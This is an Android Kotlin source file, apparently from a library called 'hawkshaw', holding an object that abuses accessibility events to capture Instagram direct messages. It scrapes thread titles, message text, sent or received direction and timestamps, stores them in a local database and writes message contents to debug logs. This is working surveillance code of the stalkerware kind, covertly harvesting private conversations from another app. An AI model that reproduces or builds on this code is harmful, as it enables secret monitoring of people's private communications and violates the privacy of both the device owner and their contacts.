package com.hawkshaw.library.features.accessibility.socialmedia

import android.graphics.Rect
import android.os.Build
import android.util.Log // Added for logging
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.TextView
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.find // Import the extension function
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt.findFirst // Import the extension function
import com.hawkshaw.library.ktextensions.getDp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.time.DayOfWeek
import java.time.format.DateTimeFormatter
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.ExecutorService
import java.util.regex.Pattern

// Added a TAG for logging
private const val TAG = "Instagram_DEBUG"

/**
 * Object responsible for extracting Instagram messages from accessibility events
 */
object Instagram {
    private const val INSTAGRAM_ID = "com.instagram.android:id"
    private val coroutineScope = CoroutineScope(Dispatchers.IO)

    /**
     * Extracts and processes Instagram messages from the provided accessibility node
     *
     * @param node The accessibility node containing Instagram message information
     * @param executor The executor service for handling background tasks (Note: executor is not directly used here, coroutineScope is)
     */
    @RequiresApi(Build.VERSION_CODES.O)
    fun extractMessages(node: AccessibilityNodeInfo, executor: ExecutorService) { // ExecutorService parameter is unused in this method currently.
        Log.d(TAG, "extractMessages called. Node: ${node.className}, Executor: $executor")

        // FIXED: Call findFirst as an extension function on 'node'
        val titleNode = node.findFirst("$INSTAGRAM_ID/thread_title")
        val title = titleNode?.text
        if (title == null) {
            Log.w(TAG, "extractMessages: Title node not found or has no text. Returning.")
            return
        }
        Log.d(TAG, "extractMessages: Extracted Title: '$title'")

        // FIXED: Call findFirst as an extension function on 'node'
        val presenceNode = node.findFirst("$INSTAGRAM_ID/thread_presence_digest")
        val presence = presenceNode?.text?.toString()
        Log.d(TAG, "extractMessages: Extracted Presence: '$presence'")

        // FIXED: Call findFirst as an extension function on 'node'
        val messageListNode = node.findFirst("$INSTAGRAM_ID/message_list")
        if (messageListNode == null) {
            Log.w(TAG, "extractMessages: Message list node ('$INSTAGRAM_ID/message_list') not found. Returning.")
            return
        }
        val childCount = messageListNode.childCount
        Log.d(TAG, "extractMessages: Message list node found. Child count: $childCount")

        var globalTimestamp: Long = System.currentTimeMillis()
        Log.d(TAG, "extractMessages: Initial globalTimestamp set to current time: $globalTimestamp")

        for (i in 0 until childCount) {
            Log.d(TAG, "extractMessages: Processing message list child at index $i")
            val child = messageListNode.getChild(i)
            if (child == null) {
                Log.w(TAG, "extractMessages: Child at index $i is null. Skipping.")
                continue
            }
            Log.v(TAG, "extractMessages: Child $i: className=${child.className}, viewIdResourceName=${child.viewIdResourceName}")


            // FIXED: Access viewIdResourceName as a property
            val viewIdResourceName = child.viewIdResourceName
            val resourceId = viewIdResourceName?.split("/")?.lastOrNull()
            Log.v(TAG, "extractMessages: Child $i: resourceId='$resourceId'")


            if (resourceId == "message_content") {
                Log.d(TAG, "extractMessages: Child $i is a 'message_content' node.")
                // FIXED: Call findFirst as an extension function on 'child'
                val messageTextNode = child.findFirst("$INSTAGRAM_ID/direct_text_message_text_view")
                val messageText = messageTextNode?.text
                if (messageText == null) {
                    Log.w(TAG, "extractMessages: Message text node not found or has no text for child $i. Skipping.")
                    child.recycle()
                    continue
                }
                Log.i(TAG, "extractMessages: Extracted Message Text (child $i): '${messageText.toString().take(50)}...'")

                val rect = Rect()
                messageTextNode.getBoundsInScreen(rect)
                Log.d(TAG, "extractMessages: Message bounds (child $i): $rect")

                // Determine if message is sent or received based on position
                val messageType = if (getDp(rect.left) < 65) {
                    Log.d(TAG, "extractMessages: Message (child $i) determined as Received (rect.left DP ${getDp(rect.left)} < 65).")
                    SocialMediaEntity.Type.Received
                } else {
                    Log.d(TAG, "extractMessages: Message (child $i) determined as Sent (rect.left DP ${getDp(rect.left)} >= 65).")
                    SocialMediaEntity.Type.Sent
                }

                // FIXED: Call findFirst as an extension function on 'child'
                val statusNode = child.findFirst("$INSTAGRAM_ID/message_status")
                val statusText = statusNode?.text?.toString()
                Log.d(TAG, "extractMessages: Extracted Status Text (child $i): '$statusText'")

                // Create a unique identifier for this message (currently unused 'identifier' variable)
                // val identifier = "$title-$messageText-${PackageName.INSTAGRAM}"

                val extractedTs = extractTimestamp(statusText, globalTimestamp)
                Log.d(TAG, "extractMessages: Timestamp for message (child $i) from extractTimestamp ('$statusText', $globalTimestamp): $extractedTs")

                val entity = SocialMediaEntity(
                    type = messageType,
                    packageName = PackageName.INSTAGRAM.name,
                    sender = null, // You might want to extract the sender based on messageType and thread title/presence
                    message = messageText.toString(),
                    timestamp = extractedTs
                )
                Log.i(TAG, "extractMessages: Created SocialMediaEntity (child $i): Type=${entity.type}, Pkg=${entity.packageName}, Msg='${entity.message?.take(50)}...', TS=${entity.timestamp}")

                coroutineScope.launch {
                    Log.d(TAG, "extractMessages: Coroutine launched to insert entity for message (child $i): ID (implicit)='${entity.message?.take(20)}...', TS=${entity.timestamp}")
                    AppDatabaseKt.db.socialMediaDao().insert(entity)
                    Log.d(TAG, "extractMessages: Coroutine finished inserting entity for message (child $i).")
                }
            }

            // FIXED: Access className and text as properties
            if (child.className == TextView::class.java.canonicalName &&
                child.text != null) {
                val childText = child.text?.toString()
                Log.d(TAG, "extractMessages: Child $i is a TextView with text: '$childText'. Potential global timestamp.")
                // This could be a timestamp indicator
                // FIXED: Access text as property
                extractGlobalTimestamp(childText)?.let {
                    Log.i(TAG, "extractMessages: Parsed global timestamp from '$childText': $it. Updating globalTimestamp.")
                    globalTimestamp = it
                } ?: Log.d(TAG, "extractMessages: Did not parse a global timestamp from '$childText'.")
            }
            child.recycle() // Recycle the child node after processing
        }
        messageListNode.recycle() // Recycle the message list node
        // titleNode and presenceNode are not explicitly recycled here, assuming they are lightweight or managed by the parent 'node'
        // If 'node' itself is not recycled by its caller, it should be.
        Log.d(TAG, "extractMessages finished processing.")
    }

    /**
     * Extracts timestamp from status text and global timestamp
     *
     * @param input The status text (e.g., "10:30 AM")
     * @param globalTimestamp A fallback timestamp or base date to apply the time to
     * @return The combined timestamp in milliseconds
     */
    fun extractTimestamp(input: String?, globalTimestamp: Long): Long {
        Log.d(TAG, "extractTimestamp called. Input: '$input', GlobalTimestamp: $globalTimestamp")
        val timePattern = Pattern.compile("(0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}")

        if (input.isNullOrEmpty()) {
            Log.d(TAG, "extractTimestamp: Input is null or empty. Returning globalTimestamp: $globalTimestamp")
            return globalTimestamp
        }
        if(!timePattern.matcher(input).matches()){
            Log.d(TAG, "extractTimestamp: Input '$input' does not match time pattern. Returning globalTimestamp: $globalTimestamp")
            return globalTimestamp
        }
        Log.d(TAG, "extractTimestamp: Input '$input' matches time pattern.")


        val timeCalendar = Calendar.getInstance()
        val timeFormat = SimpleDateFormat("hh:mm aa", Locale.getDefault())
        try {
            timeFormat.parse(input)?.let { parsedDate ->
                timeCalendar.time = parsedDate
                Log.d(TAG, "extractTimestamp: Parsed input time '$input' to: ${timeCalendar.time}")
            } ?: run {
                Log.w(TAG, "extractTimestamp: SimpleDateFormat parsed '$input' as null. Returning globalTimestamp.")
                return globalTimestamp
            }
        } catch (e: Exception) {
            Log.e(TAG, "extractTimestamp: Error parsing date '$input'. Returning globalTimestamp. Exception: ${e.message}")
            return globalTimestamp
        }


        val resultCalendar = Calendar.getInstance()
        resultCalendar.timeInMillis = globalTimestamp
        Log.v(TAG, "extractTimestamp: resultCalendar initialized with globalTimestamp: ${resultCalendar.time}")

        resultCalendar.set(Calendar.HOUR_OF_DAY, timeCalendar.get(Calendar.HOUR_OF_DAY))
        resultCalendar.set(Calendar.MINUTE, timeCalendar.get(Calendar.MINUTE))
        resultCalendar.set(Calendar.SECOND, 0) // Reset seconds and milliseconds to ensure consistency
        resultCalendar.set(Calendar.MILLISECOND, 0)
        Log.i(TAG, "extractTimestamp: Final calculated timestamp for '$input': ${resultCalendar.timeInMillis} (${resultCalendar.time})")

        return resultCalendar.timeInMillis
    }

    /**
     * Extracts global timestamp from various date formats found in message lists (e.g., "Today", "Yesterday", "Mon, Oct 26").
     *
     * @param input The string containing date/time information.
     * @return The extracted timestamp in milliseconds, or null if no valid format found.
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun extractGlobalTimestamp(input: String?): Long? {
        Log.d(TAG, "extractGlobalTimestamp called. Input: '$input'")
        if (input.isNullOrEmpty()) {
            Log.d(TAG, "extractGlobalTimestamp: Input is null or empty. Returning null.")
            return null
        }

        val fullDatePattern = Pattern.compile("[A-Za-z]{3} [A-Za-z]+ (0?[1-9]|[12][0-9]|3[01]), \\d{4}$") // Example: "Mon October 26, 2023"
        val dateTimePattern = Pattern.compile("[A-Za-z]{3} [A-Za-z]+ (0?[1-9]|[12][0-9]|3[01]), (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}") // Example: "Mon October 26, 10:30 AM"
        val todayPattern = Pattern.compile("Today (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}")
        val yesterdayPattern = Pattern.compile("Yesterday (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}")
        val weekdayPattern = Pattern.compile("[A-Za-z]{3} (0?[0-9]|1[0-9]|2[0-3]):[0-9]{2} [A-Za-z]{2}") // Example: "Mon 10:30 AM"

        val calendar = Calendar.getInstance().apply {
            set(Calendar.HOUR_OF_DAY, 0)
            set(Calendar.MINUTE, 0)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }
        Log.v(TAG, "extractGlobalTimestamp: Base calendar (start of today): ${calendar.time}")


        try { // Added try-catch for date parsing robustness
            when {
                fullDatePattern.matcher(input).matches() -> {
                    Log.d(TAG, "extractGlobalTimestamp: Input '$input' matches fullDatePattern.")
                    val dateFormat = SimpleDateFormat("EEE MMM dd, yyyy", Locale.getDefault()) // Adjusted format based on pattern
                    val date = dateFormat.parse(input) ?: return null.also { Log.w(TAG, "extractGlobalTimestamp: fullDatePattern parse failed for '$input'") }
                    Log.i(TAG, "extractGlobalTimestamp: Parsed fullDatePattern for '$input' to: ${date.time}")
                    return date.time
                }

                dateTimePattern.matcher(input).matches() -> {
                    Log.d(TAG, "extractGlobalTimestamp: Input '$input' matches dateTimePattern.")
                    val dateTimeFormat = SimpleDateFormat("EEE MMM dd, hh:mm aa", Locale.getDefault()).apply {
                        timeZone = TimeZone.getDefault()
                    }
                    val date = dateTimeFormat.parse(input) ?: return null.also { Log.w(TAG, "extractGlobalTimestamp: dateTimePattern parse failed for '$input'") }
                    Log.i(TAG, "extractGlobalTimestamp: Parsed dateTimePattern for '$input' to: ${date.time}")
                    return date.time
                }

                todayPattern.matcher(input).matches() -> {
                    Log.d(TAG, "extractGlobalTimestamp: Input '$input' matches todayPattern.")
                    val baseTime = calendar.timeInMillis
                    val timeFormat = SimpleDateFormat("hh:mm aa", Locale.getDefault()).apply {
                        timeZone = TimeZone.getDefault()
                    }
                    val timeComponent = timeFormat.parse(input.removePrefix("Today "))?.time ?: 0L
                    Log.v(TAG, "extractGlobalTimestamp: Today - BaseTime: $baseTime, TimeComponent: $timeComponent")
                    val result = baseTime + timeComponent
                    Log.i(TAG, "extractGlobalTimestamp: Parsed todayPattern for '$input' to: $result")
                    return result
                }

                yesterdayPattern.matcher(input).matches() -> {
                    Log.d(TAG, "extractGlobalTimestamp: Input '$input' matches yesterdayPattern.")
                    calendar.add(Calendar.DAY_OF_MONTH, -1)
                    val baseTime = calendar.timeInMillis
                    Log.v(TAG, "extractGlobalTimestamp: Yesterday - Calendar set to: ${calendar.time}, BaseTime: $baseTime")

                    val timeFormat = SimpleDateFormat("hh:mm aa", Locale.getDefault()).apply {
                        timeZone = TimeZone.getDefault()
                    }
                    val timeComponent = timeFormat.parse(input.removePrefix("Yesterday "))?.time ?: 0L
                    Log.v(TAG, "extractGlobalTimestamp: Yesterday - TimeComponent: $timeComponent")
                    val result = baseTime + timeComponent
                    Log.i(TAG, "extractGlobalTimestamp: Parsed yesterdayPattern for '$input' to: $result")
                    return result
                }

                weekdayPattern.matcher(input).matches() -> {
                    Log.d(TAG, "extractGlobalTimestamp: Input '$input' matches weekdayPattern.")
                    val dayOfWeekStr = input.substring(0, 3)
                    val dayInPattern = try {
                        DayOfWeek.from(DateTimeFormatter.ofPattern("EEE", Locale.getDefault()).parse(dayOfWeekStr)).value
                    } catch (e: Exception) {
                        Log.w(TAG, "extractGlobalTimestamp: weekdayPattern - Failed to parse DayOfWeek from '$dayOfWeekStr'. Exception: ${e.message}")
                        null
                    } ?: return null.also { Log.w(TAG, "extractGlobalTimestamp: weekdayPattern - DayOfWeek parsing returned null for '$dayOfWeekStr'.") }
                    Log.v(TAG, "extractGlobalTimestamp: weekdayPattern - Parsed DayOfWeek '$dayOfWeekStr' to ISO value: $dayInPattern (Mon=1, Sun=7)")


                    var currentDayOfWeekCal = calendar.get(Calendar.DAY_OF_WEEK) // Calendar.DAY_OF_WEEK (1-7, Sunday=1..Saturday=7)
                    Log.v(TAG, "extractGlobalTimestamp: weekdayPattern - Current Calendar DayOfWeek: $currentDayOfWeekCal (Sun=1..Sat=7)")


                    // Convert ISO day (Monday=1..Sunday=7) to Calendar day (Sunday=1..Saturday=7)
                    // ISO: Mon(1), Tue(2), Wed(3), Thu(4), Fri(5), Sat(6), Sun(7)
                    // Cal: Sun(1), Mon(2), Tue(3), Wed(4), Thu(5), Fri(6), Sat(7)
                    // If dayInPattern is 7 (ISO Sunday), it should map to 1 (Calendar Sunday). Otherwise, dayInPattern + 1.
                    val dayInPatternCalFormat = if (dayInPattern == 7) Calendar.SUNDAY else dayInPattern + 1
                    Log.v(TAG, "extractGlobalTimestamp: weekdayPattern - Target DayOfWeek in Calendar format: $dayInPatternCalFormat")


                    var diff = currentDayOfWeekCal - dayInPatternCalFormat
                    Log.v(TAG, "extractGlobalTimestamp: weekdayPattern - Initial day diff: $diff (currentCal - targetCal)")


                    if (diff < 0) {
                        diff += 7
                        Log.v(TAG, "extractGlobalTimestamp: weekdayPattern - Adjusted diff (target day is later in week, so previous week): $diff")
                    }
                    calendar.add(Calendar.DAY_OF_YEAR, -diff)
                    val baseTime = calendar.timeInMillis
                    Log.v(TAG, "extractGlobalTimestamp: weekdayPattern - Calendar adjusted by -$diff days to: ${calendar.time}, BaseTime: $baseTime")

                    // The SimpleDateFormat for "EEE hh:mm aa" will parse the time part correctly,
                    // but the "EEE" part might conflict if the calendar is not already set to that day.
                    // Since we've already adjusted the calendar to the correct day, we can parse just the time.
                    // Or, ensure the format reflects that the day is already set.
                    // Let's try parsing just the time from the input string after EEE.
                    val timePartString = input.substring(4) // Skip "Mon " part
                    val timeFormat = SimpleDateFormat("hh:mm aa", Locale.getDefault()).apply {
                        timeZone = TimeZone.getDefault()
                    }
                    val timeDate = timeFormat.parse(timePartString)
                    if (timeDate == null) {
                         Log.w(TAG, "extractGlobalTimestamp: weekdayPattern - Failed to parse time part '$timePartString'.")
                         return null
                    }
                    val timeCalendar = Calendar.getInstance().apply { time = timeDate }

                    // Apply the parsed time to our date-adjusted calendar
                    calendar.set(Calendar.HOUR_OF_DAY, timeCalendar.get(Calendar.HOUR_OF_DAY))
                    calendar.set(Calendar.MINUTE, timeCalendar.get(Calendar.MINUTE))
                    // Seconds and milliseconds are already zeroed out in 'calendar' from its initialization.

                    val result = calendar.timeInMillis // This should be baseTime with the new time component effectively
                    Log.i(TAG, "extractGlobalTimestamp: Parsed weekdayPattern for '$input' to: $result (${calendar.time})")
                    return result
                }
                else -> {
                    Log.d(TAG, "extractGlobalTimestamp: Input '$input' did not match any known patterns. Returning null.")
                    return null
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "extractGlobalTimestamp: General error during pattern matching or parsing for input '$input'. Exception: ${e.message}", e)
            return null
        }
    }
}

